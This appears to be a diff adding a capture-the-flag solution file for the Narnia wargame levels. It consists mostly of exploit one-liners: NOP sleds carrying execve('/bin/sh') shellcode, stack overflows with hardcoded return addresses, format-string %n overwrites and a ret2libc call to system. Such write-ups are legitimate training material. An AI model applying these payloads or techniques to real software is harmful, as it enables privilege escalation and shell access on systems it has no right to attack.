@@ -1,0 +1,35 @@
+# ref: http://shell-storm.org/shellcode/files/shellcode-399.php
+
+# narnia2
+/narnia/narnia2 `perl -e 'print "\x90"x106 . "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" . "\xc0\xd7\xff\xff"'`
+
+# narnia3
+
+# narnia4
+/narnia/narnia4 `perl -e 'print "\x90"x238 . "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" . "\xe0\xd7\xff\xff"'`
+
+# narnia5
+# format string attack on snprintf
+# overwrite the address of the stack (\x1c\xd6\xff\xff) with 496 space padded + 4 byte address using %n modifier of sprintf
+/narnia/narnia5 `python -c 'print "\x1c\xd6\xff\xff" + "%496d%5$n"'`
+/narnia/narnia5 `perl -e 'print "\x1c\xd6\xff\xff" . "%496d%5\\$n"'`
+
+# narnia6
+# run gdb, and break <system> to get the address of the shared library system function, which is \x40\x19\xe5\xf7.
+/narnia/narnia6 `perl -e 'print "A"x8 . "\x40\x19\xe5\xf7" . "\x20" . "C"x8 . "/bin/sh"'`
+
+# narnia7
+# get the address of the pointer: \x6c\xd5\xff\xff
+# then change the value using format string vulnerability in snprintf function via %n directive
+# append 134514514 spaces (%134514514d) + 4 bytes (\x6c\xd5\xff\xff), the resulting address will be the address of the hacked function:
+# 134514514 + 4 = 134514518 (= 0x8048756 in hex), which is the address of the hacked function
+/narnia/narnia7 `perl -e 'print "\x6c\xd5\xff\xff" . "%134514514d%6\\$n"'`
+
+# narnia8
+# export this on shell
+export EGG=`perl -e 'print "\x90"*10 . "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"'`
+
+# run gdb, then get the address of the local variable
+# brute force to get the exact address of the environment variable `EGG` for shell to be executed, this address will be the return address of function
+/narnia/narnia8 `perl -e 'print "A"x20 . "\xb0\xd7\xff\xff" . "A"x12 . "\x63\xd8\xff\xff"'`
+
